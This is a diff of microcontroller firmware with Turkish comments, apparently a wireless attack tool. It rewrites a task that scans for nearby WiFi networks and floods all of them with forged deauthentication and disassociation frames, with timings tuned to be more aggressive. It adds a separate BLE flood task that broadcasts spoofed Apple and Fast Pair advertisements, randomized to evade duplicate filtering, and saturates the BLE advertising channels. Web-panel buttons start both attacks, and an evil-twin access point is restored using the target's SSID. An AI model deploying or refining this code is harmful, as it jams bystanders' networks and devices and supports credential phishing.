@@ -291,6 +291,7 @@ uint8_t fake_ap_bssid[6] = {0};
 
 volatile bool deauth_active = false;
 volatile bool deauth_all_active = false;
+volatile bool ble_flood_active = false;
 volatile bool portal_busy   = false;
 int32_t ap_running_channel  = -1;
 unsigned long last_netif_check_ms = 0;
@@ -612,11 +613,16 @@ void startConnectTask() {
 // ═══════════════════════════════════════════════════════════════════════════════
 // ═══ SKB-SAFE frame gönderici: hata durumunda backoff uygular ════════════════
 // ═══════════════════════════════════════════════════════════════════════════════
+static uint32_t safeSendMgnt_ok_count  = 0;
+static uint32_t safeSendMgnt_err_count = 0;
+
 static inline void safeSendMgnt(uint8_t *frame, uint16_t len) {
   int ret = wext_send_mgnt(WLAN0_NAME, (char*)frame, len, 0);
   if (ret < 0) {
+    safeSendMgnt_err_count++;
     vTaskDelay(pdMS_TO_TICKS(DEAUTH_SKB_BACKOFF_MS));
   } else {
+    safeSendMgnt_ok_count++;
     vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_INTER_DELAY_MS));
   }
 }
@@ -764,217 +770,6 @@ void deauthTask(void *param) {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════════
-// ═══════════ DEAUTH ALL GÖREVİ — TÜM TARANAN AĞLARA DEAUTH ══════════════════
-// ═══════════════════════════════════════════════════════════════════════════════
-void deauthAllTask(void *param) {
-  (void)param;
-
-  uint8_t frame[26] = {
-    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x07, 0x00
-  };
-
-  Serial.println("\n[DeauthAll] ⚡ TÜM AĞLARA DEAUTH BAŞLANDI! ⚡");
-
-#define DEAUTH_ALL_RESCAN_INTERVAL_MS 60000UL
-  unsigned long deauth_all_last_scan_ms = 0;
-
-  while (deauth_all_active) {
-    // Periyodik otomatik yeniden tarama (60 saniyede bir)
-    unsigned long now_ms = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
-    if (now_ms - deauth_all_last_scan_ms > DEAUTH_ALL_RESCAN_INTERVAL_MS) {
-      if (scan_status == SCAN_IDLE && conn_status == CS_IDLE) {
-        Serial.println("[DeauthAll] ♻️ Otomatik yeniden tarama başlatılıyor — hedef listesi güncelleniyor...");
-        startScan();
-      }
-      deauth_all_last_scan_ms = now_ms;
-    }
-
-    // Her döngü başında güncel networks listesinden taze snapshot al
-    std::vector<NetworkInfo> snap;
-    if (networks_mutex && xSemaphoreTake(networks_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
-      snap = networks;
-      xSemaphoreGive(networks_mutex);
-    }
-
-    if (snap.empty()) {
-      vTaskDelay(pdMS_TO_TICKS(500));
-      continue;
-    }
-
-    Serial.print("[DeauthAll] 🎯 Bu turda hedef WiFi ağ sayısı: ");
-    Serial.println(snap.size());
-
-    // ── WiFi Deauth turu ──────────────────────────────────────────────────────
-    for (auto &net : snap) {
-      if (!deauth_all_active) break;
-      if (isFakeAPBSSID(net.bssid)) continue;
-
-      bool is5g = (net.channel >= 36);
-      int frameCount  = is5g ? DEAUTH_FRAME_COUNT_5G  : DEAUTH_FRAME_COUNT_2G;
-      int taskDelay   = is5g ? DEAUTH_TASK_DELAY_5G   : DEAUTH_TASK_DELAY_2G;
-      int extraBurst  = is5g ? EXTRA_BURST_COUNT_5G   : EXTRA_BURST_COUNT_2G;
-
-      wifi_set_channel(net.channel);
-      vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY_MS));
-
-      for (int burst = 0; burst < frameCount; burst++) {
-        for (int offset = -1; offset <= 1; offset++) {
-          uint8_t temp[6];
-          memcpy(temp, net.bssid, 6);
-          temp[5] = (uint8_t)(temp[5] + offset);
-
-          if (isFakeAPBSSID(temp)) continue;
-
-          memcpy(&frame[10], temp, 6);
-          memcpy(&frame[16], temp, 6);
-          memset(&frame[4], 0xFF, 6);
-          frame[0] = 0xC0; frame[24] = 0x07;
-          safeSendMgnt(frame, 26);
-
-          frame[24] = 0x02;
-          safeSendMgnt(frame, 26);
-
-          memcpy(&frame[4], temp, 6);
-          frame[0] = 0xC0; frame[24] = 0x07;
-          safeSendMgnt(frame, 26);
-
-          frame[0] = 0xA0; frame[24] = 0x07;
-          safeSendMgnt(frame, 26);
-        }
-        vTaskDelay(pdMS_TO_TICKS(taskDelay));
-      }
-
-      for (int extra = 0; extra < extraBurst; extra++) {
-        for (int offset = -1; offset <= 1; offset++) {
-          uint8_t temp[6];
-          memcpy(temp, net.bssid, 6);
-          temp[5] = (uint8_t)(temp[5] + offset);
-          if (!isFakeAPBSSID(temp)) {
-            memcpy(&frame[10], temp, 6);
-            memcpy(&frame[16], temp, 6);
-            memset(&frame[4], 0xFF, 6);
-            frame[0] = 0xC0; frame[24] = 0x07;
-            safeSendMgnt(frame, 26);
-            safeSendMgnt(frame, 26);
-          }
-        }
-        vTaskDelay(pdMS_TO_TICKS(EXTRA_BURST_DELAY_MS));
-      }
-    }
-
-    // ── BLE Flood turu: WiFi deauth turunun ardından sırayla tüm BLE profilleri ─
-    if (deauth_all_active) {
-      Serial.println("[DeauthAll] ⚡ BLE flood turu başlatılıyor...");
-      BLE.init();
-      BLE.beginPeripheral();
-
-      uint8_t rnd_data[27];
-      for (int i = 0; i < SPAM_PROFILE_COUNT && deauth_all_active; i++) {
-        const BLESpamProfile &p = SPAM_PROFILES[i];
-        memcpy(rnd_data, p.data, p.data_len);
-        // Rastgele bayt enjeksiyonu → anti-duplicate filtreyi aşar
-        if (p.is_svc) {
-          // Service Data: UUID (byte 0-1) sabit kal, model ID (2-4) rastgele
-          if (p.data_len > 4) {
-            rnd_data[2] = (uint8_t)(xTaskGetTickCount() & 0xFF);
-            rnd_data[3] = (uint8_t)((xTaskGetTickCount() >> 8) & 0xFF);
-            rnd_data[4] = (uint8_t)(i * 7 + 13);
-          }
-        } else {
-          // Manufacturer Specific: company ID (0-1) sabit kal, sonrasını rastgele
-          if (p.data_len > 6) {
-            rnd_data[6] = (uint8_t)(xTaskGetTickCount() & 0xFF);
-            rnd_data[7] = (uint8_t)((xTaskGetTickCount() >> 8) & 0xFF);
-            rnd_data[8] = (uint8_t)(i & 0xFF);
-          }
-        }
-        bleSetAdv(p.name, rnd_data, p.data_len, p.is_svc);
-        Serial.print("[DeauthAll-BLE] Yayınlanan: "); Serial.println(p.name);
-        vTaskDelay(pdMS_TO_TICKS(50)); // 80ms→50ms: daha agresif
-      }
-
-      // ── Saf rastgele flood — generic BLE kanal doygunluğu ───────────────
-      // Gerçek BLE jammer projelerinin temel tekniği: rastgele company ID ile
-      // 40 sahte cihaz paketi → ch37/38/39 tamamen dolar, yeni bağlantı imkânsız
-      Serial.println("[DeauthAll-BLE] Rastgele flood başlatılıyor...");
-      uint8_t rf[8];
-      for (int r = 0; r < 40 && deauth_all_active; r++) {
-        TickType_t t = xTaskGetTickCount();
-        rf[0] = (uint8_t)(t & 0xFF);
-        rf[1] = (uint8_t)((t >> 8) & 0x7F); // MSB=0 → geçerli company ID aralığı
-        rf[2] = (uint8_t)((t >> 4) & 0xFF);
-        rf[3] = (uint8_t)(r);
-        rf[4] = (uint8_t)((t * 3) & 0xFF);
-        rf[5] = (uint8_t)((t >> 12) & 0xFF);
-        rf[6] = (uint8_t)((t + r * 7) & 0xFF);
-        rf[7] = (uint8_t)((t >> 2) & 0xFF);
-        bleSetAdv("BT Device", rf, 8, false);
-        vTaskDelay(pdMS_TO_TICKS(30));
-      }
-
-      BLE.configAdvert()->stopAdv();
-      BLE.end();
-      Serial.println("[DeauthAll] ✓ BLE flood turu tamamlandı.");
-    }
-
-    vTaskDelay(pdMS_TO_TICKS(50));
-  }
-
-  Serial.println("[DeauthAll] WiFi+BLE deauth durduruldu.");
-  vTaskDelete(NULL);
-}
-
-// ═══════════════════════════════════════════════════════════════════════════════
-// ══════════════════ BLE SONRASI WiFi AP YENİDEN BAŞLATMA ══════════════════════
-// ═══════════════════════════════════════════════════════════════════════════════
-// BLE RF'yi devre dışı bıraktığı için BLE.end() sonrası AP'ı restore ediyoruz.
-static void restoreWiFiAP() {
-  Serial.println("[BLE→WiFi] AP yeniden başlatılıyor...");
-
-  dnsServer.stop();
-  delay(50);
-  dhcps_deinit();
-  delay(150);
-
-  wifi_set_mode(RTW_MODE_STA);
-  delay(400);
-  wifi_set_mode(RTW_MODE_STA_AP);
-  delay(400);
-
-  if (ap_switched) {
-    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL,
-                  strlen(target_ssid), 0, (int)target_channel);
-  } else {
-    wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK,
-                  (char *)AP_INITIAL_PASS,
-                  strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
-  }
-  delay(700);
-
-  ip4_addr_t ip, mask, gw;
-  IP4_ADDR(&ip,   192, 168, 4, 1);
-  IP4_ADDR(&mask, 255, 255, 255, 0);
-  IP4_ADDR(&gw,   192, 168, 4, 1);
-  netif_set_addr(&xnetif[1], &ip, &mask, &gw);
-  netif_set_up(&xnetif[1]);
-  netif_set_link_up(&xnetif[1]);
-  delay(150);
-
-  dhcps_init(&xnetif[1]);
-  delay(400);
-
-  dnsServer.begin();
-  delay(100);
-
-  wifi_disable_powersave();
-
-  Serial.println("[BLE→WiFi] ✓ AP geri açıldı.");
-}
-
-
-// ═══════════════════════════════════════════════════════════════════════════════
 // ════════════════ BLE SPAM PROFILLERI & GÖREVLERİ ═════════════════════════════
 // ═══════════════════════════════════════════════════════════════════════════════
 
@@ -1039,6 +834,265 @@ static const BLESpamProfile SPAM_PROFILES[] = {
   { "Beats Studio",   {0x4C,0x00,0x07,0x19,0x20,0x02,0x20,0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}, 27, false },
 };
 #define SPAM_PROFILE_COUNT 30
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// ═══════════ DEAUTH ALL GÖREVİ — TÜM TARANAN AĞLARA DEAUTH ══════════════════
+// ═══════════════════════════════════════════════════════════════════════════════
+void deauthAllTask(void *param) {
+  (void)param;
+
+  uint8_t frame[26] = {
+    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x07, 0x00
+  };
+
+  Serial.println("\n[DeauthAll] ⚡ TÜM AĞLARA DEAUTH BAŞLANDI! ⚡");
+
+  // ── Deauth All'a özel agresif parametreler (tek hedef deauth'u etkilemez) ──
+  const int DA_FRAME_COUNT_2G   = 12;   // 4  → 12  : burst başına frame sayısı
+  const int DA_FRAME_COUNT_5G   = 10;   // 4  → 10
+  const int DA_TASK_DELAY_2G    = 3;    // 15 → 3ms : burst arası bekleme
+  const int DA_TASK_DELAY_5G    = 3;    // 12 → 3ms
+  const int DA_EXTRA_COUNT_2G   = 4;    // 1  → 4   : ek burst sayısı
+  const int DA_EXTRA_COUNT_5G   = 5;    // 2  → 5
+  const int DA_EXTRA_DELAY_MS   = 3;    // 10 → 3ms
+  const int DA_CH_SWITCH_MS     = 5;    // 10 → 5ms : kanal geçiş gecikmesi
+
+#define DEAUTH_ALL_RESCAN_INTERVAL_MS 120000UL  // 60s→120s: daha seyrek, saldırıyı az keser
+  unsigned long deauth_all_last_scan_ms = 0;
+
+  // Görev başlar başlamaz hemen tarama yap — networks boşsa beklemeden başlat
+  if (scan_status == SCAN_IDLE) {
+    Serial.println("[DeauthAll] 🔍 İlk tarama başlatılıyor...");
+    startScan();
+    unsigned long scan_wait_start = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
+    while (scan_status == SCAN_RUNNING && deauth_all_active) {
+      if ((unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS) - scan_wait_start > 20000UL) {
+        Serial.println("[DeauthAll] ⚠️ İlk tarama timeout — mevcut listeyle devam ediliyor.");
+        break;
+      }
+      vTaskDelay(pdMS_TO_TICKS(300));
+    }
+    deauth_all_last_scan_ms = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
+  }
+
+  while (deauth_all_active) {
+    // Periyodik otomatik yeniden tarama (arka planda, deauth durdurmaz)
+    unsigned long now_ms = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
+    if (now_ms - deauth_all_last_scan_ms > DEAUTH_ALL_RESCAN_INTERVAL_MS) {
+      if (scan_status == SCAN_IDLE) {
+        Serial.println("[DeauthAll] ♻️ Arka plan yeniden tarama — saldırı sürer...");
+        startScan();  // ayrı task olarak çalışır, deauth durmaz
+      }
+      deauth_all_last_scan_ms = now_ms;
+    }
+
+    // Her döngü başında güncel networks listesinden taze snapshot al
+    std::vector<NetworkInfo> snap;
+    if (networks_mutex && xSemaphoreTake(networks_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
+      snap = networks;
+      xSemaphoreGive(networks_mutex);
+    }
+
+    if (snap.empty()) {
+      vTaskDelay(pdMS_TO_TICKS(500));
+      continue;
+    }
+
+    Serial.print("[DeauthAll] 🎯 Bu turda hedef WiFi ağ sayısı: ");
+    Serial.println(snap.size());
+
+    uint32_t ok_before  = safeSendMgnt_ok_count;
+    uint32_t err_before = safeSendMgnt_err_count;
+
+    // ── WiFi Deauth turu ──────────────────────────────────────────────────────
+    for (auto &net : snap) {
+      if (!deauth_all_active) break;
+      if (isFakeAPBSSID(net.bssid)) continue;
+
+      bool is5g = (net.channel >= 36);
+      int frameCount  = is5g ? DA_FRAME_COUNT_5G  : DA_FRAME_COUNT_2G;
+      int taskDelay   = is5g ? DA_TASK_DELAY_5G   : DA_TASK_DELAY_2G;
+      int extraBurst  = is5g ? DA_EXTRA_COUNT_5G  : DA_EXTRA_COUNT_2G;
+
+      Serial.print("[DeauthAll-WiFi] → ");
+      Serial.print(net.ssid);
+      Serial.print(" CH:");
+      Serial.print(net.channel);
+      Serial.print(is5g ? " [5G]" : " [2G]");
+
+      wifi_set_channel(net.channel);
+      vTaskDelay(pdMS_TO_TICKS(DA_CH_SWITCH_MS));
+
+      for (int burst = 0; burst < frameCount; burst++) {
+        for (int offset = -1; offset <= 1; offset++) {
+          uint8_t temp[6];
+          memcpy(temp, net.bssid, 6);
+          temp[5] = (uint8_t)(temp[5] + offset);
+
+          if (isFakeAPBSSID(temp)) continue;
+
+          memcpy(&frame[10], temp, 6);
+          memcpy(&frame[16], temp, 6);
+          memset(&frame[4], 0xFF, 6);
+          frame[0] = 0xC0; frame[24] = 0x07;
+          safeSendMgnt(frame, 26);
+
+          frame[24] = 0x02;
+          safeSendMgnt(frame, 26);
+
+          memcpy(&frame[4], temp, 6);
+          frame[0] = 0xC0; frame[24] = 0x07;
+          safeSendMgnt(frame, 26);
+
+          frame[0] = 0xA0; frame[24] = 0x07;
+          safeSendMgnt(frame, 26);
+        }
+        vTaskDelay(pdMS_TO_TICKS(taskDelay));
+      }
+
+      for (int extra = 0; extra < extraBurst; extra++) {
+        for (int offset = -1; offset <= 1; offset++) {
+          uint8_t temp[6];
+          memcpy(temp, net.bssid, 6);
+          temp[5] = (uint8_t)(temp[5] + offset);
+          if (!isFakeAPBSSID(temp)) {
+            memcpy(&frame[10], temp, 6);
+            memcpy(&frame[16], temp, 6);
+            memset(&frame[4], 0xFF, 6);
+            frame[0] = 0xC0; frame[24] = 0x07;
+            safeSendMgnt(frame, 26);
+            safeSendMgnt(frame, 26);
+          }
+        }
+        vTaskDelay(pdMS_TO_TICKS(DA_EXTRA_DELAY_MS));
+      }
+
+      Serial.println(" ✓");
+    }
+
+    {
+      uint32_t sent = safeSendMgnt_ok_count  - ok_before;
+      uint32_t fail = safeSendMgnt_err_count - err_before;
+      Serial.print("[DeauthAll-WiFi] Tur özeti — gönderilen: ");
+      Serial.print(sent);
+      Serial.print("  hata: ");
+      Serial.println(fail);
+    }
+
+    vTaskDelay(pdMS_TO_TICKS(50));
+  }
+
+  Serial.println("[DeauthAll] WiFi deauth durduruldu.");
+  vTaskDelete(NULL);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// ══════════════════ BLE FLOOD GÖREVİ — SADECE BLE SALDIRISI ══════════════════
+// ═══════════════════════════════════════════════════════════════════════════════
+void bleFloodTask(void *param) {
+  (void)param;
+  Serial.println("[BLEFlood] BLE flood saldirisi basladi.");
+
+  BLE.init();
+  BLE.beginPeripheral();
+
+  uint8_t rnd_data[27];
+  uint8_t rf[8];
+
+  while (ble_flood_active) {
+    // Tüm profilleri sırayla yayınla — rastgele bayt ile anti-duplicate aşılır
+    for (int i = 0; i < SPAM_PROFILE_COUNT && ble_flood_active; i++) {
+      const BLESpamProfile &p = SPAM_PROFILES[i];
+      memcpy(rnd_data, p.data, p.data_len);
+      TickType_t t = xTaskGetTickCount();
+      if (p.is_svc) {
+        if (p.data_len > 4) {
+          rnd_data[2] = (uint8_t)(t & 0xFF);
+          rnd_data[3] = (uint8_t)((t >> 8) & 0xFF);
+          rnd_data[4] = (uint8_t)(i * 7 + 13);
+        }
+      } else {
+        if (p.data_len > 6) {
+          rnd_data[6] = (uint8_t)(t & 0xFF);
+          rnd_data[7] = (uint8_t)((t >> 8) & 0xFF);
+          rnd_data[8] = (uint8_t)(i & 0xFF);
+        }
+      }
+      bleSetAdv(p.name, rnd_data, p.data_len, p.is_svc);
+      vTaskDelay(pdMS_TO_TICKS(20));
+    }
+
+    // Rastgele kanal doygunluğu flood
+    for (int r = 0; r < 60 && ble_flood_active; r++) {
+      TickType_t t = xTaskGetTickCount();
+      rf[0] = (uint8_t)(t & 0xFF);
+      rf[1] = (uint8_t)((t >> 8) & 0x7F);
+      rf[2] = (uint8_t)((t >> 4) & 0xFF);
+      rf[3] = (uint8_t)(r);
+      rf[4] = (uint8_t)((t * 3) & 0xFF);
+      rf[5] = (uint8_t)((t >> 12) & 0xFF);
+      rf[6] = (uint8_t)((t + r * 7) & 0xFF);
+      rf[7] = (uint8_t)((t >> 2) & 0xFF);
+      bleSetAdv("BT Device", rf, 8, false);
+      vTaskDelay(pdMS_TO_TICKS(15));
+    }
+  }
+
+  BLE.configAdvert()->stopAdv();
+  BLE.end();
+  Serial.println("[BLEFlood] BLE flood durduruldu.");
+  vTaskDelete(NULL);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// ══════════════════ BLE SONRASI WiFi AP YENİDEN BAŞLATMA ══════════════════════
+// ═══════════════════════════════════════════════════════════════════════════════
+// BLE RF'yi devre dışı bıraktığı için BLE.end() sonrası AP'ı restore ediyoruz.
+static void restoreWiFiAP() {
+  Serial.println("[BLE→WiFi] AP yeniden başlatılıyor...");
+
+  dnsServer.stop();
+  delay(50);
+  dhcps_deinit();
+  delay(150);
+
+  wifi_set_mode(RTW_MODE_STA);
+  delay(400);
+  wifi_set_mode(RTW_MODE_STA_AP);
+  delay(400);
+
+  if (ap_switched) {
+    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL,
+                  strlen(target_ssid), 0, (int)target_channel);
+  } else {
+    wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK,
+                  (char *)AP_INITIAL_PASS,
+                  strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
+  }
+  delay(700);
+
+  ip4_addr_t ip, mask, gw;
+  IP4_ADDR(&ip,   192, 168, 4, 1);
+  IP4_ADDR(&mask, 255, 255, 255, 0);
+  IP4_ADDR(&gw,   192, 168, 4, 1);
+  netif_set_addr(&xnetif[1], &ip, &mask, &gw);
+  netif_set_up(&xnetif[1]);
+  netif_set_link_up(&xnetif[1]);
+  delay(150);
+
+  dhcps_init(&xnetif[1]);
+  delay(400);
+
+  dnsServer.begin();
+  delay(100);
+
+  wifi_disable_powersave();
+
+  Serial.println("[BLE→WiFi] ✓ AP geri açıldı.");
+}
+
 
 // is_svc=false → AD type 0xFF (Manufacturer Specific)
 // is_svc=true  → AD type 0x16 (Service Data, ör. Google Fast Pair)
@@ -1179,10 +1233,16 @@ void sendStartPage(WiFiClient &client) {
   client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue' style='margin-top:10px;'>&#8635; Ağları Yenile</button></form>");
 
   if (deauth_all_active) {
-    client.print("<div style='background:#fdeced;border:1px solid #e74c3c;border-radius:8px;padding:10px 14px;margin-top:12px;text-align:center;font-size:0.9rem;font-weight:600;color:#c0392b;'>&#9889; Deauth All AKTIF — WiFi deauth + BLE flood sırayla çalışıyor</div>");
-    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:8px;background:#c0392b;box-shadow:none;'>&#9724; Deauth All Durdur</button></form>");
+    client.print("<div style='background:#fdeced;border:1px solid #e74c3c;border-radius:8px;padding:10px 14px;margin-top:12px;text-align:center;font-size:0.9rem;font-weight:600;color:#c0392b;'>&#9889; WiFi Deauth All AKTIF — tüm ağlara deauth gönderiliyor</div>");
+    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:8px;background:#c0392b;box-shadow:none;'>&#9724; WiFi Deauth All Durdur</button></form>");
   } else {
-    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:12px;background:#c0392b;box-shadow:none;'>&#9889; Deauth All — WiFi + BLE Tüm Cihazları Deauth Et</button></form>");
+    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:12px;background:#c0392b;box-shadow:none;'>&#9889; WiFi Deauth All — Tüm Ağları Deauth Et</button></form>");
+  }
+  if (ble_flood_active) {
+    client.print("<div style='background:#f0eafd;border:1px solid #8e44ad;border-radius:8px;padding:10px 14px;margin-top:8px;text-align:center;font-size:0.9rem;font-weight:600;color:#6c3483;'>&#128268; BLE Flood AKTIF — BLE kanalları dolduruluyor</div>");
+    client.print("<form method='POST' action='/ble_flood'><button type='submit' style='margin-top:8px;background:#8e44ad;box-shadow:none;'>&#9724; BLE Flood Durdur</button></form>");
+  } else {
+    client.print("<form method='POST' action='/ble_flood'><button type='submit' style='margin-top:8px;background:#8e44ad;box-shadow:none;'>&#128268; BLE Flood — Sahte BLE Cihaz Yayını</button></form>");
   }
 
   if (strlen(saved_ssid) > 0) {
@@ -1417,6 +1477,21 @@ void handleClient(WiFiClient &client) {
         } else {
           Serial.println("[DeauthAll] Ağ listesi boş veya tarama devam ediyor, deauth başlatılamadı.");
         }
+      }
+      sendStartPage(client);
+      client.flush();
+      return;
+    }
+
+    if (request.startsWith("POST") && path == "/ble_flood") {
+      if (ble_flood_active) {
+        ble_flood_active = false;
+        delay(50);
+        Serial.println("[BLEFlood] Kullanici durdurdu.");
+      } else {
+        ble_flood_active = true;
+        xTaskCreate(bleFloodTask, "ble_flood", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
+        Serial.println("[BLEFlood] Kullanici baslatti — BLE flood aktif.");
       }
       sendStartPage(client);
       client.flush();
